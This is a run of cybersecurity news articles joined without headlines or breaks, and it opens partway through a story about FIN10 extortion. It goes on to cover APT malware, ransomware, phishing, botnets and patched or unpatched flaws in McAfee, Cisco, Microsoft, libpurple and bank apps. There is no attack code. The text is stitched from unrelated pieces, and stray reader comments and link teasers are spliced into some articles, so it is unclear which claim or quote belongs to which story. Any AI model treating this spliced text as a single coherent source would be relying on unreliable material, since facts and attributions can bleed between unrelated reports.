If the ransom isn’t paid, they publish the stolen data on Pastebin-type sites. The researchers do not mention if any of the companies refused to pay and ended up having their systems and networks disrupted.
For the time being, the group seems to have concentrated on hitting companies in North America, predominately in Canada. They’ve also concentrated on two types of businesses: mining companies and casinos. Still, it’s possible that they’ve targeted companies in other industries, or will do so in the future.
FIN10 sends the extortion emails to staff and board members of the victim organizations, and are also known to contact bloggers and local journalists to inform them about the breach, likely in an attempt to pressure affected organizations into paying the ransom.
Finally, even though they sign their emails with monikers used by Russian and Serbian hackers (“Angels_Of_Truth,” “Tesla Team,” Anonymous Threat Agent”), the quality of the group’s English, the low quality of their Russian, and inconsistencies in tradecraft all point away from these particular individuals or groups.
“Emphasis in regional targeting of North American-based organizations could possibly suggest the attacker(s) familiarity with the region,” the researchers noted.
They also point out that the “relative degree of operational success enjoyed by FIN10 makes it highly probable the group will continue to conduct similar extortion- based campaigns at least in the near term.” 
Companies that have been received a similar ransom demand are advised to move fast to confirm that the breach has actually happened, to determine the scope of the breach, to contain the attack, to boot the attackers from their networks, and make sure they can’t come back.
Those last two steps are, perhaps, better done after the company definitely decides that they are ready to deal with the consequences of the attackers’ anger.
Calling in law enforcement and legal counsel for advice on what to do is also a good idea. “Understand that paying the ransom may be the right option, but there are no guarantees the attacker(s) won’t come back for more money or simply leak the data anyway. Include experts in the decision-making process and understand the risks associated with all options,” the researchers advise.
Companies that have yet to be targeted by these or other hackers would do well to improve their security posture, but also to prepare for data breaches by tightening access to their backup environment, and knowing exactly who will be called in to help in case of a breach.

Also known as “BaneChant”, MM Core is a file-less APT which is executed in memory by a downloader component.
It was first reported in 2013 under the version number “2.0-LNK” where it used the tag “BaneChant” in its command-and-control (C2) network request.
A second version “2.1-LNK” with the network tag “StrangeLove” was discovered shortly after.
In this blog we will detail our discovery of the next two versions of MM Core, namely “BigBoss” (2.2-LNK) and “SillyGoose” (2.3-LNK).
Attacks using ""BigBoss"" appear likely to have occurred since mid-2015, whereas ""SillyGoose"" appears to have been distributed since September 2016.
In 2013 MM Core was reported to target Middle Eastern and Central Asian countries.
Our own telemetry suggests that both Africa and the United States have also been recent targets.
The following list shows the targeted industries we have observed:
However, the new DOC exploit we found exploits a more recent CVE-2015-1641 Microsoft Word vulnerability which it uses to extract embedded malware.
The extracted malware is then executed by leveraging a DLL side-loading vulnerability.
The DOC file we analysed (SHA1 d336b8424a65f5c0b83328aa89089c2e4ddbcf72) was named “US pak track ii naval dialogues.doc”.
This document exploits CVE-2015-1641 and executes shellcode which drops a legitimate Microsoft executable along with a trojanised DLL named “ChoiceGuard.dll”.
The shellcode then executes the Microsoft executable, causing the malicious DLL to automatically be loaded into the file when it is run - hence the term ""side-loading"".
The DLL downloads and executes the file-less MM Core backdoor in memory, which uses steganography to hide itself inside a JPEG file.
The JPEG contains code to decrypt itself using the Shikata ga nai algorithm.
Once decrypted and executed in memory, the MM Core backdoor will extract and install an embedded downloader when it is first run and add it to Windows start-up for persistence.
This downloader, which is similar to the first trojanised DLL, is then executed and will download the MM Core JPEG once again, executing it in memory like before.
This time MM Core will conduct its backdoor routine which will send off system information and await further commands.

Cybercriminals are finding it more difficult to maintain the malicious URLs and deceptive domains used for phishing attacks for more than a few hours because action is being taken to remove them from the internet much more quickly.
That doesn't mean that phishing -- one of the most common means of performing cyber-attacks -- is any less dangerous, but a faster approach to dealing with the issue is starting to hinder attacks.
Deceptive domain names look like those of authentic services, so that somebody who clicks on a malicious link may not realise they aren't visiting the real website of the organisation being spoofed.
One of the most common agencies to be imitated by cyber-attackers around the world is that of government tax collectors. The idea behind such attacks is that people will be tricked into believing they are owed money by emails claiming to be from the taxman.
However, no payment ever comes, and if a victim falls for such an attack, they're only going to lose money when their bank details are stolen, and they can even have their personal information compromised.
In order to combat phishing and other forms of cyber-attack, the UK's National Cyber Crime Centre -- the internet security arm of GCHQ -- launched what it called the Active Cyber Defence programme a year ago.
It appears to have some success in its first 12 months because, despite a rise in registered fraudulent domains, the lifespan of a phishing URL has been reduced and the number of global phishing attacks being carried out by UK-hosted sites has declined from five percent to three percent. The figures are laid out in a new NCSC report: Active Cyber Defence - One Year On.
During that time, 121,479 phishing sites hosted in the UK, and 18,067 worldwide spoofing UK government, were taken down, with many of them purporting to be HMRC and linked to phishing emails in the form of tax refund scams. 
An active approach to dealing with phishing domains has also led to a reduction in the amount of time these sites are active, potentially limiting cybercriminal campaigns before they can gain any real traction.
Prior to the launch of the program, the average time a phishing website spoofing a UK government website remained active was for 42 hours -- or almost two days. Now, with an approach designed around looking for domains and taking them down, that's dropped to ten hours, leaving a much smaller window for attacks to be effective.
However, while this does mean there's less time for the attackers to steal information or finances, it doesn't mean that they're not successful in carrying out attacks.
The increased number of registered domains for carrying out phishing attacks shows that crooks are happy to work a little bit harder in order to reap the rewards of campaigns -- and the NCSC isn't under any illusion that the job of protecting internet users is anywhere near complete.
""The ACD programme intends to increase our cyber adversaries' risk and reduces their return on investment to protect the majority of people in the UK from cyber attacks,"" said Dr Ian Levy, technical director of the NCSC.
""The results we have published today are positive, but there is a lot more work to be done. The successes we have had in our first year will cause attackers to change their behaviour and we will need to adapt.""
A focus on taking down HMRC and other government-related domains has helped UK internet users, but cyber-attacks aren't limited by borders, with many malicious IPs hosted in practically every country used to carry out cyber-attacks around the world -- meaning every country should be playing a part.
""Obviously, phishing and web-inject attacks are not connected to the UK's IP space and most campaigns of these types are hosted elsewhere. There needs to be concerted international effort to have a real effect on the security of users,"" says the report.

A privilege escalation flaw in McAfee's True Key software remains open to exploitation despite multiple attempts to patch it.
This according to researchers with security shop Exodus Intel, who claim that CVE-2018-6661 was not fully addressed with either of the two patches McAfee released for it.
The flaw is an elevation of privilege issue in McAfee's TrueKey password manager. An exploit can be carried out on a guest account by side-loading a specially-crafted DLL into True Key that would then allow for commands and code to be executed with system-level privileges.
McAfee's summary of the flaw, published on March 30, lists it as a 'high' severity issue that was patched in version 4.20.110 - which was released in April.
Exodus says that the April release didn't fully fix the bug, however. The researchers explain that McAfee's patch only addresses one of the libraries (SDKLibAdapter) that would allow the attack to take place, with another DLL (NLog logging library) being left vulnerable to the same side-loading tactic.
""The patch is incomplete because it overlooks this and hence the nlog.dll can be utilized to allow arbitrary code execution just as the McAfee.TrueKey.SDKLibAdapter.dll could be used in versions prior to the patch,"" Exodus researchers Omar El-Domeiri and Gaurav Baruah said.
""Furthermore, any other McAfee signed binary can be used to exploit the vulnerability as long as the binary depends on a DLL outside the list of known DLLs.""
Exodus said that it notified McAfee of the issue back in August, prompting a second patch that, unfortunately, also failed to fully remedy the issue.
""However, we tested the latest version available (5.1.173.1 as of September 7th, 2018) and found that it remains vulnerable requiring no changes to our exploit.""
To its credit, McAfee acknowledged the issue and said it is still working to fully resolve the flaw.
""McAfee has been working with the researchers to confirm their findings, and has provided customers mitigation guidance to allow them to protect themselves until the company can address the reported issues via automatic product updates,"" McAfee told The Register.
In the meantime, McAfee says customers can use the True Key browser extension (which is not subject to the DLL vulnerability) rather than the Windows application.

On March 24, 2017, a member of a top-tier Russian cyber criminal forum posted an advertisement for “Fatboy,” a new ransomware-as-a-service (RaaS) product.
The advertiser, operating under the username “polnowz,” describes Fatboy as a partnership, offering support and guidance through Jabber. While the RaaS has not yet received any endorsements or feedback from the hacking community, on March 26, “ilcn,” a reputable member of the forum, offered to assist polnowz with translation in the product.
The Fatboy ransomware is dynamic in the way it targets its victims; the amount of ransom demanded is determined by the victim’s location.
According to polnowz, Fatboy uses a payment scheme based on The Economist’s Big Mac Index (cited as the “McDonald’s Index” in the product description), meaning that victims in areas with a higher cost of living will be charged more to have their data decrypted.
Purchasers of the Fatboy RaaS partner directly with the author of the malware and not through a third-party vendor. Potential partners also receive payment instantly when a victim pays their ransom, adding another level of transparency to this partnership.
Since February 7, 2017, the author of the Fatboy RaaS has purportedly earned at least $5,321 USD from their own ransomware campaigns using this product.
A computer infected with the Fatboy malware will display the above message, explaining that the user’s files have been encrypted, stating the ransom amount, and warning the user against interfering with the ransomware.
The level of transparency in the Fatboy RaaS partnership may be a strategy to quickly gain the trust of potential buyers. Additionally, the automatic price adjustment feature shows an interest in customizing malware based on the targeted victim.
Organizations should be aware of the adaptability of Fatboy, as well as other ransomware products, and continuously update their cyber security strategies as these threats evolve.

Microsoft issued numerous bug fixes on its most recent Patch Tuesday, but according to the security firm 0patch, there were issues with one of the flaws for a critical vulnerability. The vulnerability in question, (CVE-2018-8423), is a memory corruption vulnerability that exists in the Jet Database Engine that, when exploited, allows for remote code execution. 0patch noticed that the patch Microsoft had issued was flawed as a result of studying the official patch of the Jet Database Engine and a “micropatch” that the security researchers had created for the same flaw. They explain this revelation as follows:
As expected, the update brought a modified msrd3x40.dll binary: this is the binary with the vulnerability, which we had micropatched with 4 CPU instructions (one of which was just for reporting purposes). The version of msrd3x40.dll changed from 4.0.9801.0 to 4.0.9801.5 and of course, its cryptographic hash also changed - which resulted in our micropatch for this issue no longer getting applied to msrd3x40.dll.
So far so good, but the problems became glaring once further analysis began:
    We BinDiff-ed the patched msrd3x40.dll to its vulnerable version and reviewed the differences. At this point we will only state that we found the official fix to be slightly different to our micropatch, and unfortunately in a way that only limited the vulnerability instead of eliminating it. We promptly notified Microsoft about it and will not reveal further details or proof-of-concept until they issue a correct fix.
It may be a little frustrating to not know what the problem is from a tech journalist’s perspective, but as I am also an “ethical” hacker, I totally understand the lack of disclosure on the part of both Microsoft and 0patch. If the flaw is not public knowledge and has not been patched, it makes no sense to hand a cybercriminal the keys to Windows user’s machines.
What this story shows is how vital the relationship between third-party security researchers and vendors. Without the due diligence of first Trend Micro’s ZDI discovering the original flaw, and then 0patch uncovering the secondary flaw in the patch, Microsoft and their customers would be exposed to hackers with bad intentions.

Cisco Systems this week issued an update for its Adaptive Security Appliance (ASA) software, fixing a high-severity vulnerability that could allow authenticated attackers with low-level access to remotely escalate their privileges on Cisco devices with web management access enabled.
Designated CVE-2018-15465, the flaw is the result of an improper validation process while using the web management interface.
“An attacker could exploit this vulnerability by sending specific HTTP requests via HTTPS to an affected device as an unprivileged user,” states a Dec. 19 Cisco security advisory. “An exploit could allow the attacker to retrieve files (including the running configuration) from the device or to upload and replace software images on the device.”
The cybersecurity firm Tenable, whose researchers discovered the bug, explained its findings in further detail in a Dec 19 blog post.
“When command authorization is not enabled, an authenticated remote unprivileged (level 0 or 1) user can change or download the running configuration as well as upload or replace the appliance firmware,” wrote blog author and Tenable technical support engineer Ryan Seguin. “Downgrading appliance firmware to an older version would allow an attacker to leverage known vulnerabilities that have been well researched or have publicly available exploit modules.”
“Enabling command authorization prevents exploitation of this vulnerability,” notes the Cisco advisory, although “administrators should not enable command authorization using the AAA authorization command” until they have defined “which actions are allowed per privilege level using the privilege command in global configuration mode.”
Cisco adds the AAA configuration must be “accurate and complete” in order for the software fix to properly take effect.

The flaw came to light last year, after a report from security researcher Rotem Kerner.
His investigation discovered that this flaw was present in the firmware of DVRs manufactured by Chinese company TVT.
Unfortunately, this wasn't any DVR manufacturer, but a seller of white-label products, meaning other vendors purchased the DVRs from TVT, slapped their logo on top, and sold them to their own customers as separate products.
In total, Kerner tracked the sloppy-coded DVR firmware to 70 other DVR vendors.
Despite numerous contact attempts, Kerner was unable to get in contact with the company, meaning the vulnerability remained unpatched.
With exploit code publicly available, it didn't take long for attackers to target TVT-based DVRs.
This was easy because all they had to do was to ping random IPs and listen to a server response for the terms ""Cross Web Server.""
During the past year, TVT DVRs have been at the heart of many IoT DDoS botnets.
The first big botnet made up of TVT devices was discovered by Sucuri in June 2016, consisted of over 25,000 bots, and was used to launch Layer 7 DDoS attacks of up to 50,000 requests per second.
While TVT devices were regularly targeted by various IoT malware families, the vendor's name came back into news headlines during the fall of 2016, when the Mirai botnet also incorporated these DVRs into its botnet.
Now, according to a report published yesterday by cyber-security firm Palo Alto Networks, TVT devices are yet again targeted by another IoT malware that's building a huge botnet for launching DDoS attacks.
Nicknamed Amnesia, this new malware strain is based on an older version of the Tsunami IoT/Linux DDoS botnet malware.
This new Tsunami alteration is particularly advanced because this appears to be the first version of IoT malware that includes sandbox detection features, usually found in Android and Windows malware.
This self-protection feature allows the malware to detect when security experts or security products execute the malware inside a virtual machine.
According to researchers, the malware's response is something that's not been seen before, with Amnesia deleting the entire VM filesystem, most likely out of revenge after being uncovered, and desperately attempting to hide its tracks.
Currently, there are between 50,000 (according to Shodan) and up to 705,000 (according to Censys) devices on the Internet that reply with a ""Cross Web Server"" response, albeit not all are TVT DVRs.

Microsoft is aware of the zero-day, but it's highly unlikely it will be able to deliver a patch until its next Patch Tuesday, which is scheduled in three days.
McAfee researchers, who disclosed the zero-day's presence, say they've detected attacks leveraging this unpatched vulnerability going back to January this year.
Attacks with this zero-day follow a simple scenario, and start with an adversary emailing a victim a Microsoft Word document.
The Word document contains a booby-trapped OLE2link object.
If the victim uses Office Protected View when opening files, the exploit is disabled and won't execute.
If the user has disabled Protected View, the exploit executes automatically, making an HTTP request to the attacker's server, from where it downloads an HTA (HTML application) file, disguised as an RTF.
The HTA file is executed automatically, launching exploit code to take over the user's machine, closing the weaponized Word file, and displaying a decoy document instead.
According to FireEye, ""the original winword.exe process is terminated in order to hide a user prompt generated by the OLE2link.""
While the attack uses Word documents, OLE2link objects can also be embedded in other Office suite applications, such as Excel and PowerPoint.
McAfee experts say the vulnerability affects all current Office versions on all Windows operating systems.
The attack routine does not rely on enabling macros, so if you don't see a warning for macro-laced documents, that doesn't mean the document is safe.

A severe vulnerability has been disclosed in libpurple, the library used in the development of a number of popular instant messaging clients, including Pidgin and Adium for the macOS platform.
Adium 1.5.10.2 is vulnerable and can be exploited to run arbitrary code remotely.
A researcher who goes by the handle Erythronium submitted a post on March 15 to the Adium developers mailing list about the issue.
While there’s been some discussion of a fix for CVE-2017-2640, no Adium advisory or patches have been released.
In the meantime, Erythronium told Threatpost that libpurple and Adium should no longer be used.
“Unless the [Adium] dev team comes out with an advisory about this issue, a serious apology, a completely solid story about how they plan to handle future vulnerabilities in their codebase and its dependencies, and a way for people to reproduce their builds without depending on a creepy binary blob of libpurple, people should simply stop using it,” the researcher said.
“It’s also very arguable that people should stop using libpurple completely, since it also lacks strong security practices in its development”.
A request for comment from two members of the Adium team was not returned in time for publication.
“Adium’s build process documentation does not seem to include steps for upgrading or rebuilding libpurple, and the copy of libpurple checked into Adium’s open-source repository as a binary blob of unknown provenance,” Erythronium wrote in a post to the Full Disclosure mailing list.
Adium is a freely available IM client for the Apple platform, and users may connect a number of other IM networks to it, including AIM, Google Talk, Yahoo Messenger and others.
It’s written using the Cocoa API in macOS, and also supports Off the Record (OTR) encryption over XMPP.
Libpurple is used in a number of IM programs, including Pidgin on Windows Linux and UNIX builds and Finch, a text-based IM program for Linux and UNIX.
The vulnerability is an out-of-bounds write flaw that happens when invalid XML is sent by an attacker, Pidgin said in an advisory.
“Successfully exploiting this issue may allow an attacker to cause a denial-of-service condition, execute arbitrary code or perform unauthorized actions,” said a SecurityFocus advisory.
The use of messaging apps that support encryption have been encouraged since the Snowden disclosures and other challenges to secure communication such as Apple vs. FBI.
Adium specifically was included in a Privacy Pack recommended by the Electronic Frontier Foundation in the months following the Snowden leaks.
The pack was a collection of tools for privacy conscious users, and included the Tor browser, encryption extensions for browsers, HTTPS Everywhere, and Pidgin and Adium for encrypted chats.
Enterprise applications from Oracle and others could be becoming juicier targets for attackers.
Developers using the Twilio platform to build enterprise mobile communications apps have put call and text data at risk for exposure.
Between $150 million and $300 million in digital currency called ether remains inaccessible today after a user said he “accidentally” triggered a vulnerability that froze the funds in the popular Parity wallet.

When two ransomware attacks hit the city of Riverside in April and May, it wasn’t the first time the city’s public safety servers lost data because of a malicious virus, this newspaper found in a review of city records.
A check of newspapers across Ohio reveals similar unfortunate targets around the state: Licking County government, the Columbiana County courts and townships in Clinton and Morrow counties were once all ransomware victims. In Clark County, hackers encrypted the Mad River Twp. Fire and EMS servers with ransomware in December.
The damage extends across the nation: When a library system in South Carolina faced a ransomware attack, patrons couldn’t check out or return books. In Richmond, Indiana, the local housing agency fell victim to a $8,000 ransom. Hackers shut down 2,000 computers at Colorado’s transportation department, then attacked again when the agency tried to recover.
While the hackers’ ideal target — and the damage caused — varies, one certainty is that local governments are not exempt from the pain of ransomware, which is malicious software that threatens to block access to data or to publish it unless the infected organization pays a ransom.
The ransom demands are often relatively small compared to an organization’s overall budget, but the cost of avoiding payment can be steep, as the city of Atlanta found this year. An attacker demanded a $50,000 ransom to restore the Atlanta’s systems, but the city ended up shelling out nearly $2.7 million on eight emergency contracts in an attempt to fix the problem.
Experts encouraged all computer users to follow one rule to avoid ransomware’s predilection for data destruction.
“Real simple,” said John Moore, a computer technician in Trotwood. “Back up your data.”

Prior attack uncovered
Hackers hit Riverside’s police computers with ransomware several years before the latest incidents, emails obtained by the newspaper show. The attack — previously unknown to the public before this story — occurred under a prior city manager and also saw the police department lose documents, according to an email from Councilman Steve Fullenkamp to other city leaders.
Sometimes, as was the case with at least one of Riverside’s recent attacks, the virus can be downloaded by clicking on an infected email. Organizations often don’t learn they have been infected until they can’t access their data or until computer messages appear demanding a ransom payment in exchange for a decryption key, according to the FBI’s website.
The first of the recent attacks against Riverside erased about 10 months of police records, the records show. The second attack wiped just several hours of data, because the city had backed-up the data.

ENTERPRISE-FOCUSED communication platform Fuze has fixed a security vulnerability that allowed anyone to access and download recorded meetings on the platform without password authentication. 
The flaw was discovered towards the end of February by Samuel Huckins of security company Rapid7, and Fuze had disabled access to recorded meetings by the beginning of March. An update to version 4.3.1 of the Fuze platform on March 10 rectified the issue.
""Security is a top priority for Fuze and we appreciate Rapid7 identifying this issue and bringing it to our attention. When we were informed by the Rapid7 team of the issue, we took immediate action and have resolved the problem,"" Fuze said in a statement. 
The vulnerability was caused by the way in which the platform incrementally added digits to the URL of recorded meetings, which resulted in relatively easy brute-force attacks proving successful. 
Combining the simple ability to guess URLs by inputting seven digit numbers with no requirement for authentication was always going to bring the potential for disaster, though there's no suggestion that anyone with nefarious intent accessed any of the meetings. 
""Recorded Fuze meetings are saved to Fuze's cloud hosting service. They could be accessed by URLs such as 'https://browser.fuzemeeting.com/?replayId=7DIGITNUM', where '7DIGITNUM' is a seven digit number that increments over time,"" Rapid7 explains.
""Since this identifier did not provide sufficient keyspace to resist bruteforcing, specific meetings could be accessed and downloaded by simply guessing a replay ID reasonably close to the target, and iterating through all likely seven digit numbers. This format and lack of authentication also allowed one to find recordings via search engines such as Google.""

The hacker group known as The Dark Overlord (TDO) leaked today the first eight episodes of an upcoming TV game show, set to premiere on ABC on Sunday, June 11.
The show's name is Steve Harvey's Funderdome, a seed-funding competition reality series where two budding entrepreneurs go head-to-head to win over a live studio audience to fund their ideas, products or companies.
According to ABC, the first season of Funderdome will have 13 episodes. The first eight of these episodes are now available on The Pirate Bay.
At the end of April, the same hacker group leaked the first ten episodes of season 5 of Netflix's ""Orange Is The New Black"" series.
When they leaked the Netflix show, the hackers said they were also in possession of content from other networks. The named FOX, IFC, NAT GEO, and ABC.
In an interview, TDO said they got their hands on the content after they found an unprotected online database belonging to Larson Studios, Inc., an audio post-production company that works with many US television channels and Hollywood movie studios.
The hackers weren't able to extract a payment from either Larson Studios or Netflix. Last Friday, on June 2, the hackers teased that an ABC leak was coming, when they tweeted: ""American Broadcasting Company may be up next, ladies and gentlemen.""
Early Monday morning (European timezones), the hackers made good on their promise when they tweeted out the following statement in a Pastebin post.
Moments later, they tweeted a link to The Pirate Bay page where users could download the episodes. At the time of writing, only three people are attempting to download the episodes. The lack of interest is justified by this being a new game show, rather than an established brand.
I think it's better to censor links and infohashes of the torrent... this website may get sued for promoting piracy. People who need 'em will go to pirate bay anyway, no need to link it here
Surprised anyone would risk jail to steal something as stupid as ""Funderdome."" Could these leaks actually be promotional since the show is a boring ""been done before"" affair that no one would get excited over?
It's been proven top torrents get top dollar billing too.
The hacker probably didn't care about the show... he cared about the money. I think ABC paid ransom for other shows which might have been stolen by this hacker but decided to not pay for this one...

A flaw in certificate pinning exposed customers of a number of high-profile banks to man-in-the-middle attacks on both iOS and Android devices.
A vulnerability in the mobile apps of major banks could have allowed attackers to steal customers' credentials including usernames, passwords, and pin codes, according to researchers.
 The flaw was found in apps by HSBC, NatWest, Co-op, Santander, and Allied Irish bank. The banks in question have now all updated their apps to protect against the flaw.
Uncovered by researchers in the Security and Privacy Group at the University of Birmingham, the vulnerability allows an attacker who is on the same network as the victim to perform a man-in-the-middle attack and steal information.
The vulnerability lay in the certificate pinning technology, a security mechanism used to prevent impersonation attacks and use of fraudulent certificates by only accepting certificates signed by a single pinned CA root certificate.
While certificate pinning usually improves security, a tool developed by the researchers to perform semi-automated security-testing of mobile apps found that a flaw in the technology meant standard tests failed to detect attackers trying to take control of a victim's online banking. As a result, certificate pinning can hide the lack of proper hostname verification, enabling man-in-the-middle attacks.
The findings have been outlined in a research paper and presented at the Annual Computer Security Applications Conference in Orlando, Florida. The tool was run on 400 security critical apps in total, leading to the discovery of the flaw.
Tests found apps from some of the largest banks contained the flaw which, if exploited, could have enabled attackers to decrypt, view, and even modify network traffic from users of the app. That could allow them to view information entered and perform any operation that app can usually perform -- such as making payments or transferring of funds.
Other attacks allowed hackers to perform in-app phishing attacks against Santander and Allied Irish bank users, allowing attackers to take over part of the screen while the app was running and steal the entered credentials.
The researchers have worked with the National Cyber Security Centre and all the banks involved to fix the vulnerabilities, noting that the current version of all the apps affected by the pinning vulnerability are now secure.
A University of Birmingham spokesperson told ZDNet all the banks were highly cooperative: ""once this was flagged to them they did work with the team to amend it swiftly.""

If this year is anything like last we are in the midst of phishers’ attempts to trick taxpayers, employers and tax preparers into giving up information that will allow attackers to file bogus tax returns and collect IRS refunds, according to PhishLabs’ annual phishing report.
The latest Phishing Trends and Intelligence Report, which has data about January 2016, says that the IRS phishing sites spotted in that one month totaled more than the IRS phishing attempts seen during all of the previous year.
While the numbers for this January aren’t in yet, PhishLabs researchers expect yet another spike.
That’s because last year, 40 businesses that phishers asked for their employees’ W2 forms actually sent them to the scammers, says Crane Hassold, a senior security threat researcher at PhishLabs.
That’s compounded by other phishing attempts that ask tax professionals to update their accounts, then direct them to fake Web sites that steal their credentials.
And individuals received emails purportedly from tax preparers, tax software companies or banks, asking them to update their information in order to receive their returns.
The IRS posted a warning page including these and other scams criminals are using to collect someone else’s refunds or to file bogus returns.
The report is based on data gathered by PhishLabs researchers of about 1 million confirmed malicious phishing sites on more than 170,000 domains and including more than 66,000 IP addresses.
The phishing trends report found that by yearend, cloud storage services will be the most frequently targeted businesses, and almost all those attacks will be aimed at just two providers, Google and Dropbox, according to the report.
In 2016, it was nearly a dead heat for whether the financial industry or cloud storage services would be the top victim, with financial edging storage 23% to 22.6%, and “there is a strong likelihood that cloud storage services will overtake financial institutions as the most targeted industry in 2017,” the report says.
Those providers are being targeted, PhishLabs says, because they use email addresses as usernames.
“By launching phishing attacks targeting popular online services that use this authentication practice, phishers are mass harvesting email address, password credential combination that can be used to attack secondary targets,” the report says.
These secondary targets are vulnerable because it is known they use email addresses as usernames and because many people use the same usernames and passwords across different sites.
Financial industries are targets because once attackers compromise customers’ credentials, the attackers can directly steal from their accounts.
Even though cloud storage services are edging out financial services as targets, the total number of attacks against each is rising.
The number is just rising faster against the cloud storage services.
Besides financial and cloud storage, the remaining three among the top five targeted industries are webmail/online services, payment services and ecommerce sites.
Those five accounted for 91% of all phishing attacks in 2016, the report says.
Attacks against software-as-a-service businesses is increasing rapidly, targeting mainly two companies, Adobe (Adobe ID) and DocuSigh.
Again, attackers are attracted to them because they use email addresses as usernames.

The Australian Securities and Investments Commission has issued a warning after scammers posing as the regulator emailed Australian businesses on Wednesday morning with malware-laden notices.
The emails reportedly asked customers to renew their business details via provided links, which, when clicked, would activate a Javascript dropper and infect computers with malware. 
Email security vendor MailGuard issued an alert suggesting a stolen ID may have been used to help set up the scam. The originating domain, austgov.com, was registered in China, where strict regulations around domain registration require an authentic ID to be scanned.
MailGuard also said the domain was backed by a legitimate email infrastructure, which helped the emails bypass email server spam detection.
The emails come with ASIC and Australian Government branding and puts anyone who follows their instructions at risk. 
ASIC recommends users keep antivirus software up to date, be wary of emails that do not address recipients by name or that spell recipients’ names incorrectly and be suspicious of emails with unknown attachments.

One week ago a global cyberattack dubbed “unprecedented” by Europol began infecting an estimated 200,000 of the world’s computers, starting a seven-day countdown to the destruction of data if victims did not pay a ransom.
On Friday, those countdowns begin reaching zero. But as of lunchtime the attackers had claimed only about $92,000 (€82,183) in payments from their widespread ransom demands, according to Elliptic Enterprises Ltd, a UK-based company that tracks illicit use of bitcoin. The company calculates the total based on payments tracked to bitcoin addresses specified in the ransom demands.
The ransomware, called WannaCry, began infecting users on May 12th and gave them 72 hours to pay $300 in bitcoin or pay twice as much. Refusal to pay after seven days was promised to result in the permanent loss of data via irrevocable encryption.
With affected institutions including the Health Service Executive (which said it prevented the ransomware from activating), the National Health Service in the UK, FedEx and PetroChina, few initially paid up, leading to speculation that organisations were taking their chances on fixing their corrupt machines before the ransom forced a mass deletion of critical data. A week later, experts agree the financial gains of the hackers remain astonishingly low.
“With over 200,000 machines affected, the figure is lower than expected,” said Jamie Akhtar, co-founder of the London-based security software firm CyberSmart. “If even 1 per cent paid the ransom that would be $600k.”
Mr Akhtar said experts may never know how much larger this figure would have been if a so-called kill switch had not been accidentally triggered by a cyber security researcher, who registered an internet domain that acted as a disabling tool for the worm’s propagation.
While the world’s law enforcement is pointing its resources at trying to identify the culprits, Tom Robinson, chief operating officer and co-founder of Elliptic Enterprises, says it’s unlikely the money taken from victims will be taken from the digital bitcoin wallets they’re being anonymously held in.
“Given the amount of scrutiny this has come under, I would be surprised if they moved it anytime soon,” he said. “I just don’t think the risk is worth the $90,000 they’ve raised so far.”
Mr Akhtar agrees but doesn’t think the criminals have given up hope while machines infected later still have time ticking on their ransom countdown.
“It seems like they are still actively trying to bring funds in,” he said, noting a Twitter post from Symantec on Thursday, which seemed to show fresh messaging from the attackers promising to hold their end of the decryption bargain if victims paid up.
Mr Akhtar believes the best thing the perpetrators can do to hide from authorities is “destroy any evidence and abandon the bitcoin wallets”.
Of course, the hack may have nothing to do with money at all. Any movement of funds from a bitcoin wallet would act as a valuable clue for law enforcement as to who is behind the attack. Preliminary finger-pointing has already targeted groups with suspected links to the North Korean regime, but clues are still few are far between. – (Bloomberg)

Polish media reported last week that the IT security teams at many Polish banks have been busy recently searching their systems for a particular strain of malware after several unnamed banks found it on their computers.
It's not clear what the malware's end goal is, but in at least one case it was used to exfiltrate data from a bank's computer to an external server.
The nature of the stolen information could not be immediately determined because it was encrypted, Polish IT news blog Zaufana Trzecia Strona reported Friday.
After the malware program is downloaded and executed on a computer, it connects to remote servers and can be used to perform network reconnaissance, lateral movement and data exfiltration, the BadCyber researchers said in a blog post.
The malware is similar to other crimeware tools, but has not been documented before.

WannaCry only demanded $300 from each victim. These hackers extorted $1 million from one South Korean company.
Hackers appear to have pulled off a $1 million heist with ransomware in South Korea.
The ransomware attacked more than 153 Linux servers that South Korean web provider Nayana hosted, locking up more than 3,400 websites on June 10. In Nayana's first announcement a few days later, it said the hackers demanded 550 bitcoins to free up all the servers -- about $1.62 million.
Four days later, Nayana said it'd negotiated with the attackers and got the payment reduced to 397 bitcoins, or about $1 million. This is the single largest-known payout for a ransomware attack, and it was an attack on one company. For comparison, the WannaCry ransomware attacked 200,000 computers across 150 countries, and has only pooled $127,142 in bitcoins since it surfaced.
Ransomware demands have risen rapidly over the past year, tripling in price from 2015 to 2016. But even then, the highest cost of a single ransomware attack was $28,730. 
Nayana agreed to pay the ransomware in three installments, and said Saturday it's already paid two-thirds of the $1 million demand.
""It is very frustrating and difficult, but I am really doing my best and I will do my best to make sure all servers are normalized,"" a Nayana administrator said, according to a Google translation of the blog post.
The company is expected to make the final payment once all the servers from the first and second payouts have been restored.
Trend Micro, a cybersecurity research firm, identified the ransomware as Erebus, which targets Linux servers for attacks. It first surfaced in September through web ads, and popped up again in February.
""It's worth noting that this ransomware is limited in terms of coverage, and is, in fact, heavily concentrated in South Korea,"" Trend Micro researchers said Monday in a blog post.
Paying ransomware is at the victim's discretion, but nearly all organizations, including government agencies and security researchers, advise against it.

The group of hackers that leaked the upcoming fifth season of “Orange Is the New Black” this weekend may have also secured access to some three dozen other shows and movies.
TheDarkOverlord, as the group calls itself, provided cybersecurity blog DataBreaches.net with a long list of movies and TV shows it claimed to have stolen from Larson Studios, a Hollywood-based audio post-production company. In addition to “Orange Is the New Black,” it also lists a number of high-profile shows from the big broadcast networks, including ABC’s “The Catch,” NBC’s “Celebrity Apprentice,” CBS’ “NCIS Los Angeles,” and Fox’s “New Girl.”
Other shows included are IFC’s “Portlandia,” FX’s “It’s Always Sunny in Philadelphia,” “Breakthrough” from NatGeo, E!’s “The Arrangement,” “Bunk’d” from the Disney Channel, and Netflix’s “Bill Nye Saves the World.” The list also makes mention of a few movies, including the Netflix original “Win It All,” the Lifetime TV movie “A Midsummers Nightmare,” and a YouTube Red Liza Koshy special.
It’s worth noting that this list is by no means confirmed. ABC, NBC, Fox, FX, IFC, and NatGeo all declined to comment when contacted by Variety. CBS and E! did not respond.
Netflix acknowledged the breach in a statement earlier this weekend, saying: “We are aware of the situation. A production vendor used by several major TV studios had its security compromised and the appropriate law enforcement authorities are involved.” The company hasn’t commented on details of the leak.
TheDarkOverlord suggested on Twitter earlier this weekend that it might be trying to extort Fox, IFC, Nat Geo, and ABC next, but it is unknown whether they may be in the process of trying to extort other studios and networks.
The hackers had previously unsuccessfully tried to solicit extortion money from Larson Studios as well as Netflix to not release “Orange Is the New Black,” and may have used the release of the entire season this weekend as a way to pressure others to pay up.

